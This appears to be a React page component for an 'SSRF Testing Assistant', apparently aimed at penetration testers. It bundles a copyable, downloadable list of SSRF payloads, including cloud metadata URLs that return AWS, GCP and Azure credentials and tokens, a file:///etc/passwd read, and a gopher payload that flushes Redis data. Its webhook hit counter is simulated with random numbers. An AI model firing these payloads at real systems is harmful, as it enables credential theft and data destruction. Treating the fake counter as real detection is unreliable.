"use client"

import React, { useState, useEffect } from 'react';
import { useDebounce } from '@/hooks/useDebounce';
import {
    Globe,
    Copy,
    Download,
    ExternalLink,
    AlertTriangle,
    CheckCircle,
    RefreshCw,
    Search,
    Target,
    Shield,
    Info,
    Zap,
    Cloud,
    Server,
    Network,
} from 'lucide-react';

interface SSRFPayload {
    id: string;
    name: string;
    payload: string;
    description: string;
    category: string;
    riskLevel: 'low' | 'medium' | 'high' | 'critical';
    context: string;
    example: string;
}

interface WebhookData {
    id: string;
    url: string;
    created: string;
    hits: number;
    lastHit?: string;
}

const SSRFTesterPage = () => {
    const [selectedCategory, setSelectedCategory] = useState('all');
    /*const [selectedTarget, setSelectedTarget] = useState('');*/
    const [searchQuery, setSearchQuery] = useState('');
    const debouncedSearch = useDebounce(searchQuery, 300);
    const [webhookData, setWebhookData] = useState<WebhookData | null>(null);
    const [copiedPayload, setCopiedPayload] = useState('');
    const [monitoringActive, setMonitoringActive] = useState(false);
    const [testingGuideOpen, setTestingGuideOpen] = useState(false);

    const payloads: SSRFPayload[] = [
        // AWS Cloud Metadata
        {
            id: 'aws-metadata-1',
            name: 'AWS Metadata Service',
            payload: 'http://169.254.169.254/latest/meta-data/',
            description: 'Access AWS instance metadata service',
            category: 'aws',
            riskLevel: 'critical',
            context: 'AWS EC2 instances',
            example: 'Returns instance metadata including IAM roles'
        },
        {
            id: 'aws-metadata-2',
            name: 'AWS IAM Credentials',
            payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            description: 'Extract AWS IAM role credentials',
            category: 'aws',
            riskLevel: 'critical',
            context: 'AWS EC2 with IAM roles',
            example: 'Returns temporary AWS access keys'
        },
        {
            id: 'aws-metadata-3',
            name: 'AWS User Data',
            payload: 'http://169.254.169.254/latest/user-data',
            description: 'Access instance user data (often contains secrets)',
            category: 'aws',
            riskLevel: 'high',
            context: 'AWS EC2 initialization',
            example: 'May contain startup scripts with credentials'
        },

        // Google Cloud Platform
        {
            id: 'gcp-metadata-1',
            name: 'GCP Metadata Service',
            payload: 'http://metadata.google.internal/computeMetadata/v1/',
            description: 'Access GCP instance metadata',
            category: 'gcp',
            riskLevel: 'critical',
            context: 'Google Cloud instances',
            example: 'Requires Metadata-Flavor: Google header'
        },
        {
            id: 'gcp-token',
            name: 'GCP Service Account Token',
            payload: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            description: 'Extract GCP service account access token',
            category: 'gcp',
            riskLevel: 'critical',
            context: 'GCP Compute Engine',
            example: 'Returns OAuth 2.0 access token'
        },

        // Azure Cloud
        {
            id: 'azure-metadata-1',
            name: 'Azure Metadata Service',
            payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            description: 'Access Azure instance metadata',
            category: 'azure',
            riskLevel: 'high',
            context: 'Azure Virtual Machines',
            example: 'Returns VM configuration and network info'
        },
        {
            id: 'azure-token',
            name: 'Azure Access Token',
            payload: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            description: 'Extract Azure managed identity token',
            category: 'azure',
            riskLevel: 'critical',
            context: 'Azure VMs with managed identity',
            example: 'Returns Azure Resource Manager access token'
        },

        // Internal Network Discovery
        {
            id: 'internal-admin-1',
            name: 'Internal Admin Panel',
            payload: 'http://127.0.0.1:8080/admin',
            description: 'Access internal admin interfaces',
            category: 'internal',
            riskLevel: 'high',
            context: 'Internal web applications',
            example: 'Common admin panel on localhost'
        },
        {
            id: 'internal-api-1',
            name: 'Internal API Endpoint',
            payload: 'http://192.168.1.1/api/config',
            description: 'Access internal API configurations',
            category: 'internal',
            riskLevel: 'medium',
            context: 'Private network APIs',
            example: 'Internal router or device configuration'
        },
        {
            id: 'internal-db-1',
            name: 'Database Admin Interface',
            payload: 'http://10.0.0.100:8080/phpmyadmin',
            description: 'Access database management interfaces',
            category: 'internal',
            riskLevel: 'high',
            context: 'Internal database servers',
            example: 'phpMyAdmin or similar DB tools'
        },

        // Protocol Bypass
        {
            id: 'file-passwd',
            name: 'Local File Read',
            payload: 'file:///etc/passwd',
            description: 'Read local system files',
            category: 'bypass',
            riskLevel: 'high',
            context: 'File protocol support',
            example: 'Unix/Linux password file'
        },
        {
            id: 'gopher-redis',
            name: 'Redis Command Injection',
            payload: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
            description: 'Execute Redis commands via Gopher protocol',
            category: 'bypass',
            riskLevel: 'critical',
            context: 'Gopher protocol support',
            example: 'Flush all Redis data'
        },
        {
            id: 'dict-service',
            name: 'DICT Protocol Probe',
            payload: 'dict://127.0.0.1:11211/stats',
            description: 'Probe services using DICT protocol',
            category: 'bypass',
            riskLevel: 'medium',
            context: 'DICT protocol support',
            example: 'Memcached service discovery'
        },

        // DNS Exfiltration
        {
            id: 'dns-exfil-1',
            name: 'DNS Exfiltration',
            payload: 'http://ssrf-test.{WEBHOOK_DOMAIN}/',
            description: 'Trigger DNS lookup for out-of-band detection',
            category: 'oob',
            riskLevel: 'medium',
            context: 'DNS resolution logging',
            example: 'Monitor DNS queries to confirm SSRF'
        },
        {
            id: 'http-callback',
            name: 'HTTP Callback',
            payload: 'http://{WEBHOOK_URL}',
            description: 'HTTP request to external webhook',
            category: 'oob',
            riskLevel: 'medium',
            context: 'HTTP request logging',
            example: 'Direct HTTP callback detection'
        }
    ];

    const categories = [
        { id: 'all', name: 'All Payloads', icon: <Globe className="w-4 h-4" />, count: payloads.length },
        { id: 'aws', name: 'AWS Cloud', icon: <Cloud className="w-4 h-4" />, count: payloads.filter(p => p.category === 'aws').length },
        { id: 'gcp', name: 'Google Cloud', icon: <Cloud className="w-4 h-4" />, count: payloads.filter(p => p.category === 'gcp').length },
        { id: 'azure', name: 'Azure Cloud', icon: <Cloud className="w-4 h-4" />, count: payloads.filter(p => p.category === 'azure').length },
        { id: 'internal', name: 'Internal Network', icon: <Network className="w-4 h-4" />, count: payloads.filter(p => p.category === 'internal').length },
        { id: 'bypass', name: 'Protocol Bypass', icon: <Shield className="w-4 h-4" />, count: payloads.filter(p => p.category === 'bypass').length },
        { id: 'oob', name: 'Out-of-Band', icon: <Target className="w-4 h-4" />, count: payloads.filter(p => p.category === 'oob').length }
    ];

    const filteredPayloads = payloads.filter(payload => {
        const matchesCategory = selectedCategory === 'all' || payload.category === selectedCategory;
        const matchesSearch = payload.name.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            payload.description.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            payload.payload.toLowerCase().includes(debouncedSearch.toLowerCase());
        return matchesCategory && matchesSearch;
    });

    const getRiskColor = (risk: string) => {
        switch (risk) {
            case 'low': return 'bg-green-500/20 text-green-400 border-green-500/30';
            case 'medium': return 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30';
            case 'high': return 'bg-orange-500/20 text-orange-400 border-orange-500/30';
            case 'critical': return 'bg-red-500/20 text-red-400 border-red-500/30';
            default: return 'bg-gray-500/20 text-gray-400 border-gray-500/30';
        }
    };

    const getRiskIcon = (risk: string) => {
        switch (risk) {
            case 'low': return <CheckCircle className="w-4 h-4" />;
            case 'medium': return <Info className="w-4 h-4" />;
            case 'high': return <AlertTriangle className="w-4 h-4" />;
            case 'critical': return <Zap className="w-4 h-4" />;
            default: return <Info className="w-4 h-4" />;
        }
    };

    const copyToClipboard = (text: string, payloadId: string) => {
        let finalPayload = text;

        // Replace webhook placeholders if webhook is active
        if (webhookData && text.includes('{WEBHOOK')) {
            finalPayload = text
                .replace('{WEBHOOK_URL}', webhookData.url)
                .replace('{WEBHOOK_DOMAIN}', new URL(webhookData.url).hostname);
        }

        navigator.clipboard.writeText(finalPayload);
        setCopiedPayload(payloadId);
        setTimeout(() => setCopiedPayload(''), 2000);
    };

    const createWebhook = () => {
        // Generate a unique webhook ID
        const webhookId = Math.random().toString(36).substring(2, 15);
        const webhookUrl = `https://webhook.site/${webhookId}`;

        setWebhookData({
            id: webhookId,
            url: webhookUrl,
            created: new Date().toISOString(),
            hits: 0
        });

        setMonitoringActive(true);
    };

    const downloadPayloads = () => {
        const content = filteredPayloads.map(payload => {
            let finalPayload = payload.payload;
            if (webhookData && payload.payload.includes('{WEBHOOK')) {
                finalPayload = payload.payload
                    .replace('{WEBHOOK_URL}', webhookData.url)
                    .replace('{WEBHOOK_DOMAIN}', new URL(webhookData.url).hostname);
            }
            return `${payload.name}: ${finalPayload}`;
        }).join('\n');

        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'ssrf_payloads.txt';
        a.click();
        URL.revokeObjectURL(url);
    };

    // Simulate webhook monitoring (in real implementation, this would poll an API)
    useEffect(() => {
        if (monitoringActive && webhookData) {
            const interval = setInterval(() => {
                // Simulate random hits for demo
                if (Math.random() < 0.1) {
                    setWebhookData(prev => prev ? {
                        ...prev,
                        hits: prev.hits + 1,
                        lastHit: new Date().toISOString()
                    } : null);
                }
            }, 5000);

            return () => clearInterval(interval);
        }
    }, [monitoringActive, webhookData]);

    return (
        <div className="min-h-screen bg-black text-white">
            <main className="pt-20 pb-12">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">

                    {/* Hero Section */}
                    <div className="text-center mb-16">
                        <div className="flex items-center justify-center space-x-4 mb-6">
                            <div className="w-16 h-16 bg-gradient-to-br from-orange-500/20 to-orange-600/20 border border-orange-500/30 rounded-xl flex items-center justify-center shadow-lg shadow-orange-500/10">
                                <Target className="h-8 w-8 text-orange-400" />
                            </div>
                            <div>
                                <h1 className="text-4xl md:text-5xl font-bold text-white">SSRF Testing Assistant</h1>
                                <div className="flex items-center justify-center space-x-2 mt-2">
                                    <span className="bg-orange-500/20 text-orange-400 border border-orange-500/30 text-sm px-3 py-1 rounded-full">Payload Generator</span>
                                    <span className="bg-red-500/20 text-red-400 border border-red-500/30 text-sm px-3 py-1 rounded-full">OOB Detection</span>
                                </div>
                            </div>
                        </div>

                        <p className="text-lg md:text-xl text-gray-400 max-w-3xl mx-auto mb-8">
                            Generate comprehensive SSRF payloads for security testing. Includes cloud metadata, internal network discovery,
                            and out-of-band detection capabilities.
                        </p>

                        <div className="grid md:grid-cols-3 gap-6 max-w-4xl mx-auto text-center">
                            <div className="bg-gray-900/30 border border-gray-800/50 rounded-lg p-4">
                                <div className="text-orange-400 font-bold text-2xl mb-1">{payloads.length}</div>
                                <div className="text-gray-400 text-sm">SSRF Payloads</div>
                            </div>
                            <div className="bg-gray-900/30 border border-gray-800/50 rounded-lg p-4">
                                <div className="text-orange-400 font-bold text-2xl mb-1">{categories.length - 1}</div>
                                <div className="text-gray-400 text-sm">Attack Categories</div>
                            </div>
                            <div className="bg-gray-900/30 border border-gray-800/50 rounded-lg p-4">
                                <div className="text-orange-400 font-bold text-2xl mb-1">100%</div>
                                <div className="text-gray-400 text-sm">Client-Side</div>
                            </div>
                        </div>
                    </div>

                    {/* Out-of-Band Detection */}
                    <div className="mb-12">
                        <div className="bg-gray-950/60 border border-gray-800 rounded-xl p-6">
                            <h3 className="text-xl font-bold text-white mb-4 flex items-center">
                                <Target className="h-5 w-5 text-orange-400 mr-2" />
                                Out-of-Band Detection
                            </h3>

                            {!webhookData ? (
                                <div className="text-center py-8">
                                    <p className="text-gray-400 mb-4">
                                        Create a webhook to detect SSRF vulnerabilities through out-of-band callbacks
                                    </p>
                                    <button
                                        onClick={createWebhook}
                                        className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-black font-semibold px-6 py-3 rounded-lg transition-all duration-300 transform hover:scale-105"
                                    >
                                        Generate Webhook
                                    </button>
                                </div>
                            ) : (
                                <div className="space-y-4">
                                    <div className="bg-gray-800/50 border border-gray-700 rounded-lg p-4">
                                        <div className="flex items-center justify-between mb-2">
                                            <span className="text-gray-400">Webhook URL:</span>
                                            <button
                                                onClick={() => copyToClipboard(webhookData.url, 'webhook')}
                                                className="p-1 hover:bg-gray-700 rounded transition-all duration-200"
                                                title="Copy webhook URL"
                                            >
                                                <Copy className="h-4 w-4 text-gray-400" />
                                            </button>
                                        </div>
                                        <div className="font-mono text-orange-400 text-sm break-all">{webhookData.url}</div>
                                    </div>

                                    <div className="grid md:grid-cols-3 gap-4">
                                        <div className="bg-gray-800/50 border border-gray-700 rounded-lg p-4 text-center">
                                            <div className="text-2xl font-bold text-white mb-1">{webhookData.hits}</div>
                                            <div className="text-gray-400 text-sm">Total Hits</div>
                                        </div>
                                        <div className="bg-gray-800/50 border border-gray-700 rounded-lg p-4 text-center">
                                            <div className="text-2xl font-bold text-white mb-1">
                                                {monitoringActive ? '🟢' : '🔴'}
                                            </div>
                                            <div className="text-gray-400 text-sm">Status</div>
                                        </div>
                                        <div className="bg-gray-800/50 border border-gray-700 rounded-lg p-4 text-center">
                                            <div className="text-sm text-white mb-1">
                                                {webhookData.lastHit ? new Date(webhookData.lastHit).toLocaleTimeString() : 'Never'}
                                            </div>
                                            <div className="text-gray-400 text-sm">Last Hit</div>
                                        </div>
                                    </div>

                                    <div className="flex items-center space-x-2">
                                        <a
                                            href={webhookData.url}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="flex items-center space-x-2 bg-blue-500/20 hover:bg-blue-500/30 text-blue-400 px-4 py-2 rounded-lg transition-all duration-200"
                                        >
                                            <ExternalLink className="h-4 w-4" />
                                            <span>View Webhook</span>
                                        </a>
                                        <button
                                            onClick={() => setMonitoringActive(!monitoringActive)}
                                            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-all duration-200 ${
                                                monitoringActive
                                                    ? 'bg-red-500/20 hover:bg-red-500/30 text-red-400'
                                                    : 'bg-green-500/20 hover:bg-green-500/30 text-green-400'
                                            }`}
                                        >
                                            <RefreshCw className="h-4 w-4" />
                                            <span>{monitoringActive ? 'Stop Monitoring' : 'Start Monitoring'}</span>
                                        </button>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>

                    {/* Filters and Search */}
                    <div className="mb-8">
                        <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-6">
                            <div className="flex flex-col lg:flex-row gap-4">
                                {/* Search */}
                                <div className="flex-1 relative">
                                    <Search className="absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400" />
                                    <input
                                        type="text"
                                        value={searchQuery}
                                        onChange={(e) => setSearchQuery(e.target.value)}
                                        placeholder="Search payloads, descriptions..."
                                        className="w-full pl-12 pr-4 py-3 bg-gray-800/50 border border-gray-700 rounded-lg text-white placeholder:text-gray-400 focus:border-orange-500 focus:ring-2 focus:ring-orange-500/20 transition-all duration-200 outline-none"
                                    />
                                </div>

                                {/* Category Tabs */}
                                <div className="flex flex-wrap gap-2">
                                    {categories.map(category => (
                                        <button
                                            key={category.id}
                                            onClick={() => setSelectedCategory(category.id)}
                                            className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-all duration-200 ${
                                                selectedCategory === category.id
                                                    ? 'bg-orange-500/20 text-orange-400 border border-orange-500/30'
                                                    : 'bg-gray-800/50 text-gray-400 hover:text-white border border-gray-700'
                                            }`}
                                        >
                                            {category.icon}
                                            <span>{category.name}</span>
                                            <span className="text-xs opacity-75">({category.count})</span>
                                        </button>
                                    ))}
                                </div>
                            </div>

                            <div className="flex items-center justify-between mt-6 pt-6 border-t border-gray-800">
                                <div className="text-gray-300">
                                    Showing {filteredPayloads.length} of {payloads.length} payloads
                                </div>
                                <div className="flex items-center space-x-2">
                                    <button
                                        onClick={downloadPayloads}
                                        className="flex items-center space-x-2 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-black font-semibold px-4 py-2 rounded-lg transition-all duration-200"
                                    >
                                        <Download className="h-4 w-4" />
                                        <span>Download All</span>
                                    </button>
                                    <button
                                        onClick={() => setTestingGuideOpen(!testingGuideOpen)}
                                        className="flex items-center space-x-2 bg-blue-500/20 hover:bg-blue-500/30 text-blue-400 px-4 py-2 rounded-lg transition-all duration-200"
                                    >
                                        <Info className="h-4 w-4" />
                                        <span>Testing Guide</span>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Testing Guide */}
                    {testingGuideOpen && (
                        <div className="mb-8 bg-blue-900/20 border border-blue-500/30 rounded-xl p-6">
                            <h3 className="text-xl font-bold text-blue-400 mb-4 flex items-center">
                                <Info className="h-5 w-5 mr-2" />
                                SSRF Testing Guide
                            </h3>
                            <div className="grid md:grid-cols-2 gap-6 text-sm">
                                <div>
                                    <h4 className="text-blue-400 font-semibold mb-2">Testing Steps:</h4>
                                    <ol className="space-y-1 text-gray-300 list-decimal list-inside">
                                        <li>Generate webhook for OOB detection</li>
                                        <li>Select appropriate payload category</li>
                                        <li>Copy payload to clipboard</li>
                                        <li>Test on target application</li>
                                        <li>Monitor webhook for callbacks</li>
                                        <li>Analyze results and document findings</li>
                                    </ol>
                                </div>
                                <div>
                                    <h4 className="text-blue-400 font-semibold mb-2">Common Parameters:</h4>
                                    <ul className="space-y-1 text-gray-300 text-xs font-mono">
                                        <li>?url=, ?link=, ?src=, ?target=</li>
                                        <li>?redirect=, ?next=, ?callback=</li>
                                        <li>?api=, ?endpoint=, ?service=</li>
                                        <li>?file=, ?path=, ?document=</li>
                                        <li>?proxy=, ?gateway=, ?fetch=</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* Payloads Grid */}
                    <div className="space-y-4">
                        {filteredPayloads.map((payload) => (
                            <div key={payload.id} className="bg-gray-950/60 border border-gray-800 rounded-xl p-6 hover:border-orange-400/50 transition-all duration-300 group">
                                <div className="flex items-start justify-between mb-4">
                                    <div className="flex-1">
                                        <div className="flex items-center space-x-3 mb-2">
                                            <h3 className="text-lg font-semibold text-white group-hover:text-orange-400 transition-colors">
                                                {payload.name}
                                            </h3>
                                            <span className={`text-xs px-2 py-1 rounded-full border flex items-center space-x-1 ${getRiskColor(payload.riskLevel)}`}>
                                                {getRiskIcon(payload.riskLevel)}
                                                <span>{payload.riskLevel.toUpperCase()}</span>
                                            </span>
                                            <span className="text-xs bg-gray-800 text-gray-300 px-2 py-1 rounded">
                                                {categories.find(c => c.id === payload.category)?.name}
                                            </span>
                                        </div>
                                        <p className="text-gray-400 text-sm mb-3">{payload.description}</p>
                                    </div>

                                    <button
                                        onClick={() => copyToClipboard(payload.payload, payload.id)}
                                        className="p-2 bg-gray-800 hover:bg-gray-700 rounded-lg transition-all duration-200 group relative"
                                        title="Copy payload"
                                    >
                                        <Copy className="w-4 h-4 text-gray-400 group-hover:text-orange-400" />
                                        {copiedPayload === payload.id && (
                                            <div className="absolute -top-8 right-0 bg-green-500 text-black text-xs px-2 py-1 rounded">
                                                Copied!
                                            </div>
                                        )}
                                    </button>
                                </div>

                                {/* Payload */}
                                <div className="mb-4">
                                    <div className="bg-gray-950 border border-gray-700 rounded-lg p-4 font-mono text-sm relative group">
                                        <code className="text-orange-400 leading-relaxed break-all">
                                            {webhookData && payload.payload.includes('{WEBHOOK')
                                                ? payload.payload
                                                    .replace('{WEBHOOK_URL}', webhookData.url)
                                                    .replace('{WEBHOOK_DOMAIN}', new URL(webhookData.url).hostname)
                                                : payload.payload
                                            }
                                        </code>
                                    </div>
                                </div>

                                {/* Details */}
                                <div className="grid md:grid-cols-2 gap-4 text-sm">
                                    <div>
                                        <span className="text-gray-500">Context: </span>
                                        <span className="text-gray-300">{payload.context}</span>
                                    </div>
                                    <div>
                                        <span className="text-gray-500">Example: </span>
                                        <span className="text-gray-300">{payload.example}</span>
                                    </div>
                                </div>
                            </div>
                        ))}
                    </div>

                    {/* No Results */}
                    {filteredPayloads.length === 0 && (
                        <div className="text-center py-12">
                            <Target className="h-16 w-16 text-gray-600 mx-auto mb-4" />
                            <h3 className="text-xl font-semibold text-white mb-2">No payloads found</h3>
                            <p className="text-gray-400 mb-6">Try adjusting your search or category filters</p>
                            <button
                                onClick={() => {
                                    setSearchQuery('');
                                    setSelectedCategory('all');
                                }}
                                className="bg-orange-500 hover:bg-orange-600 text-black font-semibold px-6 py-3 rounded-lg transition-all duration-200"
                            >
                                Clear Filters
                            </button>
                        </div>
                    )}

                    {/* Security Notice */}
                    <div className="mt-16 bg-gradient-to-r from-red-500/10 to-red-600/5 border border-red-500/20 rounded-xl p-8">
                        <h3 className="text-2xl font-bold text-white mb-4 flex items-center">
                            <AlertTriangle className="w-6 h-6 text-red-400 mr-2" />
                            Security & Legal Notice
                        </h3>
                        <div className="grid md:grid-cols-2 gap-6 text-sm">
                            <div>
                                <h4 className="text-red-400 font-semibold mb-3">Authorized Testing Only</h4>
                                <div className="space-y-2 text-gray-300">
                                    <div>• Only test on systems you own or have explicit permission to test</div>
                                    <div>• Unauthorized testing is illegal and unethical</div>
                                    <div>• Follow responsible disclosure practices</div>
                                    <div>• Respect rate limits and system resources</div>
                                </div>
                            </div>
                            <div>
                                <h4 className="text-red-400 font-semibold mb-3">Best Practices</h4>
                                <div className="space-y-2 text-gray-300">
                                    <div>• Use unique identifiers in OOB testing</div>
                                    <div>• Document all testing activities</div>
                                    <div>• Clean up test artifacts after testing</div>
                                    <div>• Report findings through proper channels</div>
                                </div>
                            </div>
                        </div>

                        <div className="mt-6 p-4 bg-red-900/20 border border-red-500/30 rounded-lg">
                            <p className="text-red-300 text-sm">
                                <strong>Disclaimer:</strong> This tool is for educational and authorized security testing purposes only.
                                Users are responsible for ensuring compliance with all applicable laws and regulations.
                                The creators assume no liability for misuse of this tool.
                            </p>
                        </div>
                    </div>

                    {/* Technical Details */}
                    <div className="mt-12 bg-gray-900/30 border border-gray-800 rounded-xl p-6">
                        <h3 className="text-xl font-bold text-white mb-4 flex items-center">
                            <Server className="h-5 w-5 text-orange-400 mr-2" />
                            Technical Implementation
                        </h3>
                        <div className="grid md:grid-cols-3 gap-6 text-sm">
                            <div>
                                <h4 className="text-orange-400 font-semibold mb-3">Payload Categories</h4>
                                <div className="space-y-1 text-gray-300">
                                    <div>• Cloud Metadata (AWS, GCP, Azure)</div>
                                    <div>• Internal Network Discovery</div>
                                    <div>• Protocol Bypass Techniques</div>
                                    <div>• Out-of-Band Detection</div>
                                </div>
                            </div>
                            <div>
                                <h4 className="text-orange-400 font-semibold mb-3">Detection Methods</h4>
                                <div className="space-y-1 text-gray-300">
                                    <div>• HTTP Callback Monitoring</div>
                                    <div>• DNS Query Logging</div>
                                    <div>• Response Time Analysis</div>
                                    <div>• Error Message Inspection</div>
                                </div>
                            </div>
                            <div>
                                <h4 className="text-orange-400 font-semibold mb-3">Common Targets</h4>
                                <div className="space-y-1 text-gray-300">
                                    <div>• File upload functionality</div>
                                    <div>• URL validation endpoints</div>
                                    <div>• Webhook integrations</div>
                                    <div>• PDF/document generators</div>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Footer Info */}
                    <div className="mt-12 text-center text-gray-500 text-sm">
                        <p>
                            SSRF Testing Assistant - Built for security professionals by security professionals.
                            <br />
                            Always test responsibly • Follow ethical guidelines • Report vulnerabilities properly
                        </p>
                    </div>
                </div>
            </main>
        </div>
    );
};

export default SSRFTesterPage;